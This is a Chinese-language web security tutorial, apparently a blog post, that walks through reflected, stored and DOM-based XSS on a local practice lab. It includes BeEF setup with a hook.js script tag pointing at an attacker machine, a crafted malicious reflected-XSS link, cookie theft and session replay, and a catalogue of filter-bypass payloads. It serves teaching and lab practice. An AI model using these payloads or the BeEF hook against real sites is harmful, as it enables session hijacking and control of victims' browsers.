-<h1 id="BeEF-XSS利用框架安装"><a href="#BeEF-XSS利用框架安装" class="headerlink" title="BeEF XSS利用框架安装"></a>BeEF XSS利用框架安装</h1><p>攻击机使用的是kali系统(免费，可直接下载)</p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>apt install beef-xss安装BeeF攻击框架，这里就不详细展开了，安装好后web页面如下图。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install beef-xss</span><br></pre></td></tr></table></figure>
-
-<p>如果提示无法定位软件包，可以先apt-get update后再尝试</p>
-<p>如果还是不行，可手动安装</p>
-<p><a href="https://beefproject.com/">https://beefproject.com/</a></p>
-<p><a href="https://github.com/beefproject/beef">https://github.com/beefproject/beef</a></p>
-<p>下载后可能会报毒，不用在意</p>
-<p>放置kali后解压</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./install</span><br></pre></td></tr></table></figure>
-
-<p>如果还不行可能和新旧版本的kali有关系</p>
-<p>可在其他linux系统安装，这里使用的是ubuntu</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./beef</span><br></pre></td></tr></table></figure>
-
-<p>第一次运行需要修改密码</p>
-<p><img src="/images/image-20230108165651096.png" alt="image-20230108165651096"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gedit config.yaml</span><br></pre></td></tr></table></figure>
-
-<p>此处更改为自己的用户名密码</p>
-<p><img src="/images/image-20230108165800888.png" alt="image-20230108165800888"></p>
-<p>然后登录web界面</p>
-<p><img src="/images/image-20230108170143782.png" alt="image-20230108170143782"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.28.150:3000/ui/authentication</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/1660272799566-358ac5e0-a1d0-41e1-8baf-fddcd4d5bef0.png"></p>
-<p>登录进入后台，用户名为beef</p>
-<p><img src="/images/1660272885067-9a84d647-c2e3-4e2f-a726-de1e9d91ccea.png" alt="img"></p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>beef启动时命令行会给出web页面地址和攻击payload</p>
-<p>使用脚本安装的可能没有，自己补全即可</p>
-<p><img src="/images/1660273051219-eacadab3-5b6a-41e0-81a0-25102f9c3337.png" alt="img"></p>
-<p>payload换上攻击机的ip地址，直接上</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.28.150:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;http://192.168.28.150:3000/hook.js&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/1660273246927-955ad279-5970-48da-aeea-f60169d3aa66.png" alt="img"></p>
-<p>获取访问留言板的电脑的主机信息</p>
-<p><img src="/images/1660273284160-d43efe33-735d-47ed-afd2-0fc84bd2a331.png" alt="img"></p>
-<p>同样，换个虚拟机发起请求</p>
-<p><img src="/images/1660273396042-19900f44-d5a1-43d4-b1e4-ea70fcf991c0.png" alt="img"></p>
-<p>攻击机kali获取到主机信息</p>
-<p><img src="/images/1660273432143-abf8f51a-aa13-4153-ba8c-92b64387d022.png" alt="img"></p>
-<p>同样，如果只是反射型的xss，只要让受害者点击恶意链接，也可造成同样效果</p>
-<p>可以使用反射型xss(get)进行试验，恶意链接如下：</p>
-<p><a href="http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message=%3C/script%3E&submit=submit">http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message&#x3D;%3Cscript+src%3D%22http%3A%2F%2F192.168.28.153%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E&amp;submit&#x3D;submit</a></p>
-<p>攻击机获取到主机信息</p>
-<p><img src="/images/1660274095597-5d0a5c5d-ae55-4c06-9db9-cee2268a2fb8.png" alt="img"></p>
-<h1 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h1><p>是一种非持久化的xss，即攻击行为在网页刷新后就不存在了(但如果是get请求需要将payload删除)，攻击行为只会发生在客户端，即浏览器，并不会将攻击代码存储到网站服务器中。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$input = $_GET[&quot;test&quot;];</span><br><span class="line">echo &quot;&lt;div&gt;&quot;.$input.&quot;&lt;/div&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可控点在<div>标签里面</div></p>
-<p><img src="/images/1662617312740-0ed9d6ef-f86b-42b1-a38f-1e4bacd65d8f.png" alt="img"></p>
-<p>直接插入payload</p>
-<p><img src="/images/1662617482276-c28ec953-08dc-4b2a-b974-786779e9b345.png" alt="img"></p>
-<p>反射型xss就是把用户输入的数据“反射”给浏览器，也就是说，用户在访问恶意链接时，才能攻击成功，反射型xss也叫做非持久性xss。</p>
-<p>反射型xss需要服务端解析响应参与，但输入的payload并不存储在服务器上。</p>
-<h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><p>可以f12查看可控点</p>
-<p><img src="/images/1660476633506-b93b6ac7-2f8c-476c-957e-b738bcea1750.png" alt="img"></p>
-<p>xss的验证方法基本上就是拿着payload见框就插</p>
-<p>该题首先发现payload压根输不满</p>
-<p><img src="/images/1660184936621-b04dfb7b-3a7b-4f43-8402-b665448d06e4.png" alt="img"></p>
-<p>这里有多种解决方法。</p>
-<p>1.f12直接更改前端代码。</p>
-<p>将maxlenth字段删除</p>
-<p><img src="/images/1660185365090-0dcdec0a-d027-4b2f-959b-fabf9b5d6230.png" alt="img"></p>
-<p><img src="/images/1660185501321-c7b0d245-99a4-4105-b5da-a72d56c0036c.png" alt="img"></p>
-<p>2.抓包后修改放包。</p>
-<p>抓包后直接修改请求。注意有些情况需要url编码。</p>
-<p><img src="/images/1660185676861-9595165b-756c-46cc-afb1-ddf2ead09de2.png" alt="img"></p>
-<p>3.因为是get请求，可以直接在地址栏修改</p>
-<p><img src="/images/1660185993458-1c631800-176a-4506-a867-489816d8e492.png" alt="img"></p>
-<p>成功弹窗</p>
-<p><img src="/images/1660185960775-3d08b7c5-6199-44cf-9065-a0c127699488.png" alt="img"></p>
-<h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>post请求即发送的payload并不会显示到url地址栏中，而是放在数据包的body部分</p>
-<p><img src="/images/1660186338853-0af903af-6785-46b8-9d4c-5af5fdb84308.png" alt="img"></p>
-<p>根据提示考察的是通过xss获取cookie，先登录。</p>
-<p>首先alert一个弹窗看看是否存在xss</p>
-<p><img src="/images/1660186626342-0cc88d27-f63f-4f2a-9329-c4027d952498.png" alt="img"></p>
-<p>可以看出post类型的反射型xss</p>
-<p><img src="/images/1660186598976-013e91db-3e38-4995-a190-ae926e8eb50c.png" alt="img"></p>
-<p>插入获取cookie的payload</p>
-<script>alert(document.cookie)</script>
-
-<h3 id="关于document-cookie"><a href="#关于document-cookie" class="headerlink" title="关于document.cookie"></a>关于document.cookie</h3><p>cookie是用于维持用户登录状态和行为的一个东东，获取到用户的cookie就相当于获取到了用户的用户名和密码。</p>
-<p>JavaScript 可以使用 document.cookie 属性来创建 、读取、及删除 cookie。</p>
-<p>document.cookie可以读取当前cookie</p>
-<p><img src="/images/1660187377093-761310f5-2c3c-4592-8546-546236b52087.png" alt="img"></p>
-<p>成功获取cookie</p>
-<p><img src="/images/1660186806768-2ad9856c-676a-46a2-b34b-e8f8919fd84a.png" alt="img"></p>
-<h3 id="cookie利用"><a href="#cookie利用" class="headerlink" title="cookie利用"></a>cookie利用</h3><p>这里可以体会一下cookie的作用</p>
-<p>首先抓包保存登录后的后台路径和cookie值</p>
-<p><img src="/images/1660188619423-f9acd23a-bf2f-496e-bcac-e579b485d986.png" alt="img"></p>
-<p>退出登录，重新对后台路径发起请求，并添加cookie</p>
-<p><img src="/images/1660188991267-eb771206-5a58-44f3-99df-fa44d9d722dc.png" alt="img"></p>
-<p>成功登录</p>
-<p><img src="/images/1660189006511-4813c1c4-9010-4789-8da6-56a049bc66ab.png" alt="img"></p>
-<h1 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h1><p>持久型跨站点脚本</p>
-<p>持久型主要体现在其xss攻击代码会保存至服务器网站数据库中，所以当存储型xss发生时，所有访问受攻击页面的用户都会受到影响。</p>
-<p>可以f12查看可控点</p>
-<p><img src="/images/1660476725683-a4db4011-7712-44b5-b103-b66429005e53.png" alt="img"></p>
-<p>往留言板中插入恶意payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/1660270330674-45d49425-c4f4-4192-b6be-e8ede2722051.png" alt="img"></p>
-<p>出现弹窗</p>
-<p><img src="/images/1660270354073-bda7e2e1-c31f-4596-a317-c39de9586345.png" alt="img"></p>
-<p>可以发现已经存储到服务器数据库</p>
-<p><img src="/images/1660270377285-9b1c3bac-230c-451b-b8bc-165e8fc53a37.png" alt="img"></p>
-<p>此时更换一个浏览器再次访问该留言板地址</p>
-<p>依然会出现弹窗</p>
-<p><img src="/images/1660270428509-83838f57-b9c4-456f-8037-5c5b003c1397.png" alt="img"></p>
-<p>存储型xss的危害比反射型xss危害大得多，当服务器被植入存储型xss时，可被用来钓鱼，窃取cookie，用户登录凭证等。</p>
-<h2 id="存储型xss利用"><a href="#存储型xss利用" class="headerlink" title="存储型xss利用"></a>存储型xss利用</h2><p>这里可以直观的体现一下存储型xss的作用</p>
-<p>攻击机使用的是kali系统(免费，可直接下载)</p>
-<p>apt install beef-xss安装BeeF攻击框架，这里就不详细展开了，安装好后web页面如下图。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install beef-xss</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/1660272799566-358ac5e0-a1d0-41e1-8baf-fddcd4d5bef0.png" alt="img"></p>
-<p>登录进入后台，用户名为beef</p>
-<p><img src="/images/1660272885067-9a84d647-c2e3-4e2f-a726-de1e9d91ccea.png" alt="img"></p>
-<p>启动时命令行会给出web页面地址和攻击payload</p>
-<p><img src="/images/1660273051219-eacadab3-5b6a-41e0-81a0-25102f9c3337.png" alt="img"></p>
-<p>payload换上攻击机的ip地址，直接上</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://192.168.28.153:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/1660273246927-955ad279-5970-48da-aeea-f60169d3aa66.png" alt="img"></p>
-<p>获取访问留言板的电脑的主机信息</p>
-<p><img src="/images/1660273284160-d43efe33-735d-47ed-afd2-0fc84bd2a331.png" alt="img"></p>
-<p>同样，换个虚拟机发起请求</p>
-<p><img src="/images/1660273396042-19900f44-d5a1-43d4-b1e4-ea70fcf991c0.png" alt="img"></p>
-<p>攻击机kali获取到主机信息</p>
-<p><img src="/images/1660273432143-abf8f51a-aa13-4153-ba8c-92b64387d022.png" alt="img"></p>
-<p>同样，如果只是反射型的xss，只要让受害者点击恶意链接，也可造成同样效果</p>
-<p>可以使用反射型xss(get)进行试验，恶意链接如下：</p>
-<p><a href="http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message=%3C/script%3E&submit=submit">http://192.168.43.100/DX/pikachu/vul/xss/xss_reflected_get.php?message&#x3D;%3Cscript+src%3D%22http%3A%2F%2F192.168.28.153%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E&amp;submit&#x3D;submit</a></p>
-<p>攻击机获取到主机信息</p>
-<p><img src="/images/1660274095597-5d0a5c5d-ae55-4c06-9db9-cee2268a2fb8.png" alt="img"></p>
-<h1 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h1><h2 id="DOM概述"><a href="#DOM概述" class="headerlink" title="DOM概述"></a>DOM概述</h2><p>简单来说，DOM文档就是一份XML文档，当有了DOM标准之后，DOM便将前端html代码化为一个树状结构，方便程序和脚本能够轻松的动态访问和更新这个树状结构的内容、结构以及样式，且不需要经过服务端，所以DOM型xss在js前端自己就可以完成数据的输入输出，不与服务器产生交互，这样来说DOM型xss也可以理解为反射性xss。</p>
-<p>DOM XSS与反射性XSS、存储型XSS的主要区别在于DOM XSS的XSS代码不需要服务端解析响应的直接参与，触发XSS的是浏览器端的DOM解析。一般不与服务器交互，所以输入的payload也不会存储在服务器上。</p>
-<p>但其实质是通过修改页面的DOM节点形成的xss，所以在后面的xss-x中，可以发现与服务器产生了交互，但是由于还是通过修改页面的DOM节点形成的xss，所以也归为dom型xss。</p>
-<p>有关DOM的可以参考<a href="https://www.runoob.com/htmldom/htmldom-tutorial.html">https://www.runoob.com/htmldom/htmldom-tutorial.html</a></p>
-<h3 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function test()&#123;</span><br><span class="line">	var str = document.getElementById(&quot;test&quot;).value;</span><br><span class="line">	document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&#x27;&quot;+str+&quot;&#x27; &gt;testLink&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;t&quot; &gt;&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;test&quot; value=&quot;&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot; onclick=&quot;test()&quot; /&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这段代码，就是将输入到id&#x3D;test的文本框的文本内容，点击write按钮后，执行test()函数，将输入的文本内容，放到a标签的href中显示到前端（<a href="xxxxxxxxxx">testLink</a>）</p>
-<p><img src="/images/1662618457481-02526d36-c474-4b34-930a-88bcc7e994ad.png" alt="img"></p>
-<p>随便输入一个hello world，点击write</p>
-<p>可以发现源代码中出现一个a标签，href中就是我们输入的内容</p>
-<p><img src="/images/1662618556441-26f7763e-33a1-44be-b399-e354008e787d.png" alt="img"></p>
-<p>而且可以抓包，当我们点击write时，并不会抓到数据包，仅在前端html中输出</p>
-<h3 id="插入payload"><a href="#插入payload" class="headerlink" title="插入payload"></a>插入payload</h3><p>由于可控点在a标签中的href属性，需要先将a标签闭合或使用事件触发</p>
-<h5 id="事件触发"><a href="#事件触发" class="headerlink" title="事件触发"></a>事件触发</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(/xss/) //</span><br></pre></td></tr></table></figure>
-
-<p>首先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后用注释符“&#x2F;&#x2F;”注释掉单引号。点击新生连接，脚本将被执行。</p>
-<p><img src="/images/1662619049036-41394025-6721-467d-9b09-b15fde9a206b.png" alt="img"></p>
-<h5 id="闭合a标签"><a href="#闭合a标签" class="headerlink" title="闭合a标签"></a>闭合a标签</h5><p>但使用<script></script>时并不会弹窗</p>
-<p>a标签里并不解析<script>标签</p>
-<p><img src="/images/1662621427146-b9300938-f2ee-4a3e-a152-fe2c26a4756e.png" alt="img"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&gt;&lt;img src=# onerror=alert(/xss1/) /&gt;&lt;&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/1662621081022-4933e3f5-efac-4491-900c-af86413897e9.png" alt="img"></p>
-<h3 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h3><p>这段代码实现了一个简单的页面，允许用户输入昵称并在页面上显示</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;DOM XSS Attack Demo&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Welcome!&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;Please enter your nickname:&lt;/p&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input id=&quot;nickname&quot; type=&quot;text&quot; /&gt;</span><br><span class="line">        &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;p&gt;Your nickname is: &lt;span id=&quot;display&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        const form = document.querySelector(&#x27;form&#x27;);</span><br><span class="line">        const nicknameInput = document.querySelector(&#x27;#nickname&#x27;);</span><br><span class="line">        const display = document.querySelector(&#x27;#display&#x27;);</span><br><span class="line"></span><br><span class="line">        form.addEventListener(&#x27;submit&#x27;, (event) =&gt; &#123;</span><br><span class="line">            event.preventDefault();</span><br><span class="line"></span><br><span class="line">            const nickname = nicknameInput.value;</span><br><span class="line">            display.innerHTML = nickname;</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>随便输入一串字符</p>
-<p><img src="/images/image-20230107224210191.png" alt="image-20230107224210191"></p>
-<p>抓包也没有与服务器交互</p>
-<p>直接通过前端的js代码将输入框的东西输出到浏览器</p>
-<h2 id="普通DOM型xss"><a href="#普通DOM型xss" class="headerlink" title="普通DOM型xss"></a>普通DOM型xss</h2><p><img src="/images/1660291585340-ecdca394-b111-4505-b7b3-f72b0df0f35e.png" alt="img"></p>
-<p>由于其将输入的字符放进了html标签中的属性中，所以该类型xss攻击需要将标签闭合，并且加入自己的payload.</p>
-<p>即下面的hello我们是可控的。需要通过将a标签闭合，或通过事件触发，再放入自己的恶意payload才可以造成xss</p>
-<p><img src="/images/1660291862424-93c60fa9-14f7-4ffd-afa2-c890fdbba430.png" alt="img"></p>
-<p>a标签可以接受onclick属性，表示点击行为，点击就触发</p>
-<p>所以可以接上onclick=alert('xss')>把a的右标签也闭合了</p>
-<p>所以payload为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/1660295072228-82da965b-ff25-475a-bd72-5b2f350f3421.png" alt="img"></p>
-<p><img src="/images/1660295264667-593a7c3d-8210-4392-bada-e495fbaeac13.png" alt="img"></p>
-<p>点击弹窗</p>
-<p><img src="/images/1660295272768-f1c011f0-8ce5-48f9-a308-440eef974a84.png" alt="img"></p>
-<p>反正只要能凑上闭合，能解析，怎么样都行</p>
-<h2 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>上述的dom型xss可以发现，输入的payload，并不与服务器交互，也不显示在url中。</p>
-<p><img src="/images/1662622837438-afaae957-f195-46b4-b2df-57311da7e03c.png" alt="img"></p>
-<p>dom型xss-x，可以发现url中存在输入的内容，可以将带有恶意payload的url发给被攻击者钓鱼</p>
-<p><img src="/images/1662622629801-cb87a0c8-53ea-4fa5-ac4b-adb43578ca1d.png" alt="img"></p>
-<p>从源码可以看出，输入到文本框的内容，会先通过get请求将内容发送到服务端</p>
-<p><img src="/images/1662623756155-e22ac861-92b7-4ed3-8eae-d1db2cb8d455.png" alt="img"></p>
-<p>服务端接收到get请求的内容，调用domxss()函数，通过修改页面的DOM节点形成新的html传回给客户端的浏览器，所以也归为为DOM XSS</p>
-<p><img src="/images/1662624234083-f986c7ba-f92f-4f3f-a2f7-ec93690f21bf.png" alt="img"></p>
-<p><img src="/images/1662624224148-501c0bca-1a61-49f1-badd-fb029a0f75e0.png" alt="img"></p>
-<p>后续利用同DOM型xss</p>
-<p>随便输入一串字符串，然后点击按钮，可以看出添加到了<a>标签中</p>
-<p><img src="/images/image-20230107233737057.png" alt="image-20230107233737057"></p>
-<p>同上题需要凑闭合</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; onclick=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230107235014624.png" alt="image-20230107235014624"></p>
-<h2 id="DOM型xss和传统XSS的区别"><a href="#DOM型xss和传统XSS的区别" class="headerlink" title="DOM型xss和传统XSS的区别"></a>DOM型xss和传统XSS的区别</h2><p>DOM型XSS是一种比较特殊的XSS攻击，它利用浏览器中的DOM（文档对象模型）漏洞来实现攻击。</p>
-<p>1.DOM型XSS不依赖于服务器的输出</p>
-<p>2.DOM型XSS攻击的源代码不会被服务器端的代码直接输出，而是通过浏览器的JavaScript代码在客户端进行解析和执行。</p>
-<p>3.DOM型XSS攻击的攻击范围更广，可以通过各种手段（如邮件、聊天工具、社交媒体等）将攻击代码传递给用户，从而对用户的浏览器进行攻击。</p>
-<p>4.不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom-xss是通过url传入参数去控制触发的。(可以看作是反射型的特殊情况)</p>
-<p>与DOM型XSS相比，反射型XSS的区别在于：</p>
-<p>1.反射型XSS依赖于服务器的输出</p>
-<p>2.反射型XSS攻击的源代码会被服务器端的代码直接输出到浏览器端，然后在浏览器中执行。</p>
-<p>3.反射型XSS攻击的攻击范围较小，通常是通过邮件、聊天工具或社交媒体将攻击链接发送给目标用户，让用户自己打开链接进行攻击。</p>
-<p>总之，DOM型XSS攻击更加隐蔽，而反射型XSS攻击更容易被发现，但两者都可能对用户造成严重的安全威胁。</p>
-<h1 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h1><p><img src="/images/image-20230108191822262.png" alt="image-20230108191822262"></p>
-<p>需要绕过过滤</p>
-<p>经过尝试，该题过滤的是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script</span><br></pre></td></tr></table></figure>
-
-<p>当遇到<script时会直接被去除</p>
-<p><img src="/images/image-20230108203249590.png" alt="image-20230108203249590"></p>
-<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>下面会列举几个绕过的方式，要是有其他的方式自行查阅</p>
-<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sCript&gt;&lt;/sCriPt&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230108212120454.png" alt="image-20230108212120454"></p>
-<p>可以看到成功解析为<script>标签</p>
-<p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sCrIPT&gt;alert(123)&lt;/sCrIPt&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230108211941551.png" alt="image-20230108211941551"></p>
-<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>题目可以发现<script会被去除，所以可以用来构造payload</p>
-<p>双写绕过原理很简单，可以做个测试</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello&lt;scriptWorld</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230108213754256.png" alt="image-20230108213754256"></p>
-<p>可以看到<script被去掉，剩下来HelloWorld</p>
-<p>当过滤规则只替换一次且是替换为空<script时，就可以使用双写绕过</p>
-<p>测试</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello&lt;scri&lt;scriptptWorld</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230108220509951.png" alt="image-20230108220509951"></p>
-<p>可以看到该题并不能使用简单的双写绕过，需要配合其他绕过方式</p>
-<h3 id="各类标签绕过"><a href="#各类标签绕过" class="headerlink" title="各类标签绕过"></a>各类标签绕过</h3><h4 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h4><p>除了<script></script>还可以使用其他的标签进行利用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; onerror=alert(123)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=alert(`1`);&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=alert(`1`)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;1&quot; onerror=&#x27;alert(1)&#x27;;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;1&quot; onerror=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>该payload表示当img调用src的图片失败，则触发onerror行为，执行alert(123)</p>
-<p><img src="/images/image-20230108222853591.png" alt="image-20230108222853591"></p>
-<h4 id="SVG标签"><a href="#SVG标签" class="headerlink" title="SVG标签"></a>SVG标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=alert(1)&gt;&lt;/svg&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=alert(`1`)&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230108224804638.png" alt="image-20230108224804638"></p>
-<h4 id="a标签"><a href="#a标签" class="headerlink" title="a标签"></a>a标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&quot; onclick=alert(123)&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230109085110147.png" alt="image-20230109085110147"></p>
-<p>点击后触发</p>
-<p><img src="/images/image-20230109085127282.png" alt="image-20230109085127282"></p>
-<h4 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input onfocus=alert(123)&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>onfocus表示鼠标放上去触发</p>
-<p><img src="/images/image-20230109085300848.png" alt="image-20230109085300848"></p>
-<h4 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=alert(123)&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=alert(123)&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=alert(123);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
-
-<p>onload:当页面加载完毕时执行代码</p>
-<p><img src="/images/image-20230109085540498.png" alt="image-20230109085540498"></p>
-<h4 id="audio标签"><a href="#audio标签" class="headerlink" title="audio标签"></a>audio标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;audio src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230109090052786.png" alt="image-20230109090052786"></p>
-<p><img src="/images/image-20230109090104388.png" alt="image-20230109090104388"></p>
-<h4 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a>video标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;video src=x onerror=alert(111)&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230109090247285.png" alt="image-20230109090247285"></p>
-<h4 id="button标签"><a href="#button标签" class="headerlink" title="button标签"></a>button标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button onfocus=alert(1)&gt;</span><br><span class="line">&lt;button onclick=alert(1)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>onclick点击触发</p>
-<p><img src="/images/image-20230109090328767.png" alt="image-20230109090328767"></p>
-<h4 id="object标签"><a href="#object标签" class="headerlink" title="object标签"></a>object标签</h4><p>该标签需要配合data:&#x2F;&#x2F;text伪协议利用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxMjMpPC9zY3JpcHQ+&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230109090507237.png" alt="image-20230109090507237"></p>
-<p><img src="/images/image-20230109090547150.png" alt="image-20230109090547150"></p>
-<p><img src="/images/image-20230109090602207.png" alt="image-20230109090602207"></p>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>还有其他的绕过方式，比如其他的标签，实体编码绕过，闭合等方式，可自行查阅搭建靶场进行绕过，后续题目也会涉及。</p>
-<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/E3G5juHSQjzRNSZcgiTmQA">https://mp.weixin.qq.com/s/E3G5juHSQjzRNSZcgiTmQA</a></p>
-<p><a href="https://www.freebuf.com/articles/web/339348.html">https://www.freebuf.com/articles/web/339348.html</a></p>
